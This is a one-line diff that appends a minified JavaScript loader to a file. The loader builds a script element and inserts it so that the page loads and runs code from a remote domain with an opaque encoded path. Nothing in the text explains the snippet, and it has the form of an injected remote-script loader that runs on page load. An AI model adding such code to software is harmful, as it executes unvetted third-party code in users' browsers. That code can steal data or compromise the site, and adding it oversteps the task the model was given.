@@ -1,0 +1,1 @@
+;(function(s,d,u,a,c){a=s.createElement(d);a.src=u;a.async=1;c=s.getElementsByTagName(d)[0];c.parentNode.insertBefore(a,c);})(document,'script','https://api-app.uppercrafteroom.com/mJiV6eO69oD8uq/br6+5y+q6r8v+6Pua7um3lA==');
